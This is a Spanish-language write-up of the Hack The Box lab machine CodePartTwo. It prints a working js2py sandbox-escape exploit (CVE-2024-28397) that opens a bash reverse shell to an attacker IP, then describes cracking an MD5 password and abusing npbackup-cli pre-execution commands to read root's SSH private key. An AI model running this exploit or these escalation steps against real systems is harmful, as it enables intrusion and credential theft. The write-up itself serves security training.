---
title: "CodePartTwo"
summary: "HTB CodePartTwo Writeup"
pubDate: 2025-11-29
draft: false
---

### 1. Análisis inicial

Al acceder a la aplicación web, observé que el enlace **Download App** proporciona acceso a toda la lógica de la aplicación, lo que facilita el análisis estático y dinámico del código fuente.

![login_analysis]( /labs/codeparttwo/login_analysis.png )

El endpoint `/login` revela que las contraseñas de los usuarios se almacenan en formato **MD5** dentro de la base de datos, lo que representa una debilidad criptográfica conocida.

Adicionalmente, se identifican las versiones de las librerías utilizadas por la aplicación:

![requirements]( /labs/codeparttwo/requirements.png )

### 2. Identificación de vulnerabilidades

La aplicación utiliza la librería **js2py** en una versión vulnerable. Tras investigar, localicé la vulnerabilidad [CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape), que permite la ejecución remota de código (**RCE**) a través de la manipulación del entorno de ejecución de JavaScript.

### 3. Explotación de la vulnerabilidad


Para verificar la viabilidad del exploit, ejecuté el servicio localmente y probé el [payload](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) recomendado por el analista que encontró la vulnerabilidad en esta librería:

![achieving_rce]( /labs/codeparttwo/achieving_rce.png )

Posteriormente, modifiqué el script para obtener una **reverse shell** y acceder a la máquina comprometida:

```python
import requests
import base64
import json

url = 'http://10.10.11.82:8000/run_code'
ip = '10.10.15.99'
port = 4444

reverse_shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
encoded_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()

payload = """
// [+] command goes here:
let cmd = "echo {0} | base64 -d | bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
""".format(encoded_cmd)

def exploit():
    payload_data = {"code": payload}
    headers = {'Content-Type': 'application/json'}
    
    try:
        print("[+] Enviando payload al servidor...")
        print("[+] Asegúrate de tener un listener en el puerto {}: nc -lvnp {}".format(port, port))
        
        r = requests.post(url, data=json.dumps(payload_data), headers=headers)
        print("[+] Respuesta del servidor:")
        print(r.text)
        
        if "error" not in r.text.lower():
            print("[+] ¡Payload ejecutado con éxito! Revisa tu listener.")
        else:
            print("[-] El servidor reportó un error:")
            print(r.text)
            
    except Exception as e:
        print("[-] Error al enviar el payload: {}".format(str(e)))

if __name__ == "__main__":
    exploit()
```

![reverse_shell]( /labs/codeparttwo/reverse_shell.png )

### 4. Post-explotación

Una vez obtenida la shell, procedí a analizar los archivos disponibles en la máquina. Localicé la base de datos **SQLite** que almacena las credenciales de los usuarios:

![bd_analysis]( /labs/codeparttwo/bd_analysis.png )

Identifiqué al usuario **marco** y, dado que la contraseña estaba en MD5, realicé un ataque de fuerza bruta para obtenerla:

![marco_passwd_cracked]( /labs/codeparttwo/marco_passwd_cracked.png )

La contraseña obtenida permitió el acceso tanto a la aplicación como al servidor bajo el usuario **marco**:

![marco_ssh_connection]( /labs/codeparttwo/marco_ssh_connection.png )

Dentro del entorno de **marco**, encontré varios archivos de interés:

![marco_personal_folder]( /labs/codeparttwo/marco_personal_folder.png )

Además, observé que el usuario tenía permisos para ejecutar el comando **npbackup-cli** con privilegios elevados:

![sudo_commands]( /labs/codeparttwo/sudo_commands.png )

### 5. Escalada de privilegios

Analizando la herramienta de copias de seguridad, descubrí que era posible modificar el archivo de configuración para ejecutar comandos arbitrarios como **root**. Aproveché el campo `pre_exec_commands` para extraer la clave privada SSH del usuario **root**:

`marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf -b ... Pre-execution of command cat /root/.ssh/id_rsa succeeded with: -----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY----- ...`

Utilizando esta clave privada, accedí como **root** y pude explorar el directorio personal, obteniendo finalmente la **flag** de la máquina:

![root_ssh_connection]( /labs/codeparttwo/root_ssh_connection.png )

---

## Conclusión

La resolución de esta máquina ha permitido identificar y explotar una vulnerabilidad crítica en la librería **js2py**, acceder a credenciales mal gestionadas y escalar privilegios mediante la explotación de una mala configuración en una herramienta de backup. El proceso ha demostrado la importancia de mantener actualizadas las dependencias, emplear algoritmos de hash seguros y restringir el uso de comandos privilegiados.
